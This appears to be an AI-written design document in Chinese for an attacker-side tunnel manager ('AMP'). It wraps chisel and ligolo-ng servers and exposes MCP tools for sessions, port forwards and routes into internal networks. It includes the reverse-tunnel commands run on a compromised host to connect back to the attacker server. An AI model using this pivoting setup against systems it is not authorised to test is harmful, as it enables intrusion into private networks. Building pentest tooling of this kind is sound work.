# 🔬 Tunnel 层重新设计 - 深度研究

## 您的核心思路

**AMP 作为攻击机端的服务器管理器**:
- ✅ 启动 server 端监听
- ✅ 管理受控机连接的 session
- ✅ 控制端口转发、流量路由
- ✅ 只管服务端，不管客户端

---

## Chisel 工作原理研究

### 架构模式

```
攻击机 (AMP)                    受控机
  ↓                              ↓
chisel server                chisel client
  监听 8080                      连接 8080
  ↓                              ↓
  接受连接 ← ← ← ← ← ← ← ← ← ← ← 建立连接
  ↓
  创建 session
  ↓
  管理端口转发
```

### Server 端核心功能

#### 1. 启动监听
```bash
chisel server --port 8080 --host 0.0.0.0
```

**功能**:
- 监听指定端口
- 等待客户端连接
- 支持多个客户端同时连接

#### 2. Session 管理
```
每个客户端连接 = 一个 session
session 包含:
  - 客户端 ID
  - 连接状态
  - 活跃的端口转发
  - 流量统计
```

#### 3. 端口转发控制

**客户端发起**:
```bash
# 客户端连接时指定转发规则
chisel client server:8080 R:9000:localhost:80
# R:9000 = 在服务器上监听 9000
# localhost:80 = 转发到客户端的 localhost:80
```

**服务器端看到**:
```
Session 1:
  - Remote forward: 0.0.0.0:9000 → client:localhost:80
  - 状态: active
  - 流量: 1.2MB
```

### Chisel Server API

**Chisel 本身没有 HTTP API**，但我们可以通过：

1. **进程管理**
```python
# 启动 server
process = subprocess.Popen([
    'chisel', 'server',
    '--port', '8080',
    '--host', '0.0.0.0',
    '--auth', 'user:pass',  # 认证
    '--keepalive', '30s',
    '--backend', 'stdio',  # 输出到 stdio
])

# 监控输出获取 session 信息
# Chisel 会输出: "session#1 tun: Listening on 0.0.0.0:9000"
```

2. **解析日志**
```python
# Chisel 输出格式
"2024/05/07 12:00:00 server: Listening on 0.0.0.0:8080"
"2024/05/07 12:01:00 server: session#1 tun: proxy#R:0.0.0.0:9000=>localhost:80: Listening"
"2024/05/07 12:02:00 server: session#1: Disconnected"
```

3. **通过 /proc 获取连接信息**
```python
# 查看 chisel 进程的网络连接
import psutil
proc = psutil.Process(chisel_pid)
connections = proc.connections()
# 可以看到所有活跃的端口和连接
```

---

## Ligolo-ng 工作原理研究

### 架构模式

```
攻击机 (AMP)                    受控机
  ↓                              ↓
ligolo-ng proxy              ligolo-ng agent
  监听 11601                     连接 11601
  ↓                              ↓
  接受连接 ← ← ← ← ← ← ← ← ← ← ← 建立连接
  ↓
  创建 TUN 接口
  ↓
  路由流量到 agent
```

### Proxy 端核心功能

#### 1. 启动监听
```bash
ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601
```

**功能**:
- 监听指定端口
- 自动生成 TLS 证书
- 等待 agent 连接

#### 2. Session 管理

**交互式命令**:
```bash
ligolo-ng » session
# 列出所有 session

ligolo-ng » session 1
# 切换到 session 1

ligolo-ng [session-1] » ifconfig
# 查看 agent 的网络接口

ligolo-ng [session-1] » listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:80
# 添加端口转发
```

#### 3. 路由控制

**添加路由**:
```bash
ligolo-ng [session-1] » start
# 启动 TUN 接口

# 在系统中添加路由
ip route add 10.0.0.0/24 dev ligolo
# 所有到 10.0.0.0/24 的流量都通过 ligolo TUN 接口
```

### Ligolo-ng 的优势

1. **TUN 接口** - 真正的网络层隧道
2. **交互式控制** - 可以动态添加/删除转发
3. **多 session** - 支持多个 agent 同时连接

### Ligolo-ng 控制方式

**问题**: Ligolo-ng 是交互式的，没有 API

**解决方案**:
1. **通过 stdin 发送命令**
```python
process = subprocess.Popen(
    ['ligolo-ng', 'proxy', '-selfcert'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# 发送命令
process.stdin.write(b'session\n')
process.stdin.flush()

# 读取输出
output = process.stdout.readline()
```

2. **解析输出获取 session 信息**
```python
# Ligolo-ng 输出格式
"INFO[0000] Agent joined. name=agent-1 remote=192.168.1.100:12345"
"INFO[0001] Session created. id=1 agent=agent-1"
```

---

## 重新设计方案

### 核心理念

**AMP = 隧道服务器管理器**
- 启动和管理 server/proxy 进程
- 监控客户端连接（session）
- 控制端口转发和路由
- 提供统一的 API

---

### 新架构设计

```
TunnelManager
  ├── ChiselServer (管理 chisel server)
  │     ├── start_server()
  │     ├── list_sessions()
  │     ├── add_forward(session_id, ...)
  │     └── remove_forward(session_id, ...)
  │
  ├── LigoloProxy (管理 ligolo-ng proxy)
  │     ├── start_proxy()
  │     ├── list_sessions()
  │     ├── add_listener(session_id, ...)
  │     └── add_route(session_id, ...)
  │
  └── SessionManager (统一 session 管理)
        ├── track_sessions()
        ├── get_session_info()
        └── close_session()
```

---

### 详细设计

#### 1. ChiselServer

```python
class ChiselServer:
    """Chisel server 管理器"""
    
    def __init__(self, port: int, auth: str | None = None):
        self.port = port
        self.auth = auth
        self.process = None
        self.sessions = {}  # session_id -> SessionInfo
    
    def start(self):
        """启动 chisel server"""
        cmd = [
            'chisel', 'server',
            '--port', str(self.port),
            '--host', '0.0.0.0',
            '--keepalive', '30s',
        ]
        if self.auth:
            cmd.extend(['--auth', self.auth])
        
        self.process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # 启动日志监控线程
        threading.Thread(target=self._monitor_logs, daemon=True).start()
    
    def _monitor_logs(self):
        """监控 chisel 输出，提取 session 信息"""
        for line in self.process.stdout:
            # 解析: "session#1 tun: proxy#R:0.0.0.0:9000=>localhost:80"
            if 'session#' in line:
                session_id, info = self._parse_session_line(line)
                self.sessions[session_id] = info
    
    def list_sessions(self) -> list[SessionInfo]:
        """列出所有活跃 session"""
        return list(self.sessions.values())
    
    def get_session_forwards(self, session_id: str) -> list[Forward]:
        """获取 session 的端口转发"""
        session = self.sessions.get(session_id)
        return session.forwards if session else []
```

**关键点**:
- ✅ 启动 server 监听
- ✅ 通过日志监控 session
- ✅ 提取端口转发信息
- ⚠️ 无法主动控制转发（由客户端决定）

**限制**:
- Chisel 的转发规则由客户端指定
- Server 端只能被动接受
- 无法动态添加/删除转发

---

#### 2. LigoloProxy

```python
class LigoloProxy:
    """Ligolo-ng proxy 管理器"""
    
    def __init__(self, port: int):
        self.port = port
        self.process = None
        self.sessions = {}
        self.command_queue = queue.Queue()
    
    def start(self):
        """启动 ligolo-ng proxy"""
        cmd = [
            'ligolo-ng', 'proxy',
            '-selfcert',
            '-laddr', f'0.0.0.0:{self.port}'
        ]
        
        self.process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # 启动命令发送线程
        threading.Thread(target=self._command_sender, daemon=True).start()
        # 启动输出监控线程
        threading.Thread(target=self._monitor_output, daemon=True).start()
    
    def _command_sender(self):
        """发送命令到 ligolo-ng"""
        while True:
            cmd = self.command_queue.get()
            self.process.stdin.write(cmd + '\n')
            self.process.stdin.flush()
    
    def _monitor_output(self):
        """监控 ligolo-ng 输出"""
        for line in self.process.stdout:
            # 解析: "Agent joined. name=agent-1"
            if 'Agent joined' in line:
                session_info = self._parse_agent_line(line)
                self.sessions[session_info.id] = session_info
    
    def list_sessions(self) -> list[SessionInfo]:
        """列出所有 session"""
        self.command_queue.put('session')
        # 等待并解析输出
        return list(self.sessions.values())
    
    def add_listener(self, session_id: str, listen_addr: str, target_addr: str):
        """添加端口转发"""
        # 切换到 session
        self.command_queue.put(f'session {session_id}')
        # 添加 listener
        self.command_queue.put(
            f'listener_add --addr {listen_addr} --to {target_addr}'
        )
    
    def add_route(self, session_id: str, network: str):
        """添加路由"""
        self.command_queue.put(f'session {session_id}')
        self.command_queue.put('start')  # 启动 TUN
        # 在系统中添加路由
        subprocess.run(['ip', 'route', 'add', network, 'dev', 'ligolo'])
```

**关键点**:
- ✅ 启动 proxy 监听
- ✅ 监控 agent 连接
- ✅ 动态添加端口转发
- ✅ 动态添加路由
- ✅ 完全控制

---

#### 3. 统一的 Session 管理

```python
class SessionInfo:
    """统一的 session 信息"""
    id: str
    tunnel_type: str  # 'chisel' or 'ligolo'
    remote_addr: str  # 客户端地址
    connected_at: datetime
    status: str  # 'active', 'disconnected'
    forwards: list[Forward]  # 端口转发列表
    routes: list[Route]  # 路由列表（ligolo）
    stats: TrafficStats  # 流量统计

class Forward:
    """端口转发信息"""
    listen_addr: str  # 监听地址 (e.g., "0.0.0.0:9000")
    target_addr: str  # 目标地址 (e.g., "localhost:80")
    protocol: str  # 'tcp' or 'udp'
    bytes_sent: int
    bytes_received: int

class TunnelManager:
    """统一的隧道管理器"""
    
    def __init__(self):
        self.chisel_servers = {}  # port -> ChiselServer
        self.ligolo_proxies = {}  # port -> LigoloProxy
    
    def start_chisel_server(self, port: int, auth: str | None = None):
        """启动 chisel server"""
        server = ChiselServer(port, auth)
        server.start()
        self.chisel_servers[port] = server
        return server
    
    def start_ligolo_proxy(self, port: int):
        """启动 ligolo-ng proxy"""
        proxy = LigoloProxy(port)
        proxy.start()
        self.ligolo_proxies[port] = proxy
        return proxy
    
    def list_all_sessions(self) -> list[SessionInfo]:
        """列出所有 session"""
        sessions = []
        for server in self.chisel_servers.values():
            sessions.extend(server.list_sessions())
        for proxy in self.ligolo_proxies.values():
            sessions.extend(proxy.list_sessions())
        return sessions
    
    def add_forward(self, session_id: str, listen_addr: str, target_addr: str):
        """添加端口转发（仅 ligolo 支持）"""
        session = self._find_session(session_id)
        if session.tunnel_type == 'ligolo':
            proxy = self._get_proxy_for_session(session)
            proxy.add_listener(session_id, listen_addr, target_addr)
        else:
            raise NotSupported("Chisel 不支持服务端动态添加转发")
```

---

## MCP 工具设计

### 新的工具集

```python
# 1. 启动隧道服务器
start_tunnel_server(
    tunnel_type: 'chisel' | 'ligolo',
    port: int,
    auth: str | None = None
)

# 2. 列出所有 session
list_tunnel_sessions(
    tunnel_type: str | None = None  # 过滤类型
) -> list[SessionInfo]

# 3. 添加端口转发（ligolo only）
add_port_forward(
    session_id: str,
    listen_addr: str,  # "0.0.0.0:9000"
    target_addr: str   # "localhost:80"
)

# 4. 添加路由（ligolo only）
add_route(
    session_id: str,
    network: str  # "10.0.0.0/24"
)

# 5. 获取 session 详情
get_session_info(
    session_id: str
) -> SessionInfo

# 6. 关闭 session
close_session(
    session_id: str
)

# 7. 停止服务器
stop_tunnel_server(
    tunnel_type: str,
    port: int
)
```

---

## 实战场景

### 场景 1: Chisel 隧道

```python
# 1. AMP 启动 chisel server
start_tunnel_server(tunnel_type='chisel', port=8080, auth='user:pass')

# 2. 受控机连接
# (在受控机上手动执行)
# chisel client http://amp-server:8080 R:9000:localhost:80 --auth user:pass

# 3. AMP 查看 session
sessions = list_tunnel_sessions(tunnel_type='chisel')
# [
#   {
#     "id": "session-1",
#     "remote_addr": "192.168.1.100:12345",
#     "forwards": [
#       {"listen": "0.0.0.0:9000", "target": "localhost:80"}
#     ]
#   }
# ]

# 4. 访问转发的端口
# curl http://amp-server:9000
# → 流量通过 chisel → 受控机:localhost:80
```

**特点**:
- ✅ 简单易用
- ⚠️ 转发规则由客户端指定
- ⚠️ 服务端无法动态修改

---

### 场景 2: Ligolo-ng 隧道

```python
# 1. AMP 启动 ligolo-ng proxy
start_tunnel_server(tunnel_type='ligolo', port=11601)

# 2. 受控机连接
# (在受控机上手动执行)
# ligolo-ng agent -connect amp-server:11601 -ignore-cert

# 3. AMP 查看 session
sessions = list_tunnel_sessions(tunnel_type='ligolo')
# [
#   {
#     "id": "1",
#     "remote_addr": "192.168.1.100:12345",
#     "agent_name": "agent-1"
#   }
# ]

# 4. AMP 动态添加端口转发
add_port_forward(
    session_id="1",
    listen_addr="0.0.0.0:9000",
    target_addr="localhost:80"
)

# 5. AMP 添加路由
add_route(session_id="1", network="10.0.0.0/24")

# 6. 访问内网
# curl http://10.0.0.50
# → 流量通过 ligolo TUN → 受控机 → 10.0.0.50
```

**特点**:
- ✅ 完全控制
- ✅ 动态添加转发和路由
- ✅ 真正的网络层隧道
- ⚠️ 需要 root 权限（TUN 接口）

---

## 优劣对比

| 特性 | Chisel | Ligolo-ng |
|------|--------|-----------|
| **启动难度** | 简单 | 简单 |
| **客户端连接** | 简单 | 简单 |
| **服务端控制** | ❌ 被动 | ✅ 主动 |
| **动态转发** | ❌ 不支持 | ✅ 支持 |
| **路由控制** | ❌ 无 | ✅ TUN 接口 |
| **权限要求** | 普通用户 | root (TUN) |
| **适用场景** | 简单端口转发 | 复杂网络渗透 |

---

## 实现优先级

### P0 - 立即实现
1. ✅ ChiselServer - 启动和监控
2. ✅ Session 监控 - 解析日志
3. ✅ 基础 MCP 工具

### P1 - 短期实现
4. ✅ LigoloProxy - 启动和监控
5. ✅ 动态转发控制
6. ✅ 路由管理

### P2 - 长期优化
7. ⚠️ 流量统计
8. ⚠️ Session 健康检查
9. ⚠️ 自动重连

---

## 总结

**您的思路完全正确！**

**核心设计**:
- AMP = 服务端管理器
- 启动 server/proxy 监听
- 管理客户端 session
- 控制转发和路由

**关键发现**:
- Chisel: 被动接受，客户端控制转发
- Ligolo-ng: 主动控制，服务端管理一切

**建议**:
- 优先实现 Ligolo-ng（更强大）
- Chisel 作为简单场景的备选
- 提供统一的 API

**下一步**: 开始实现新的 Tunnel 架构？
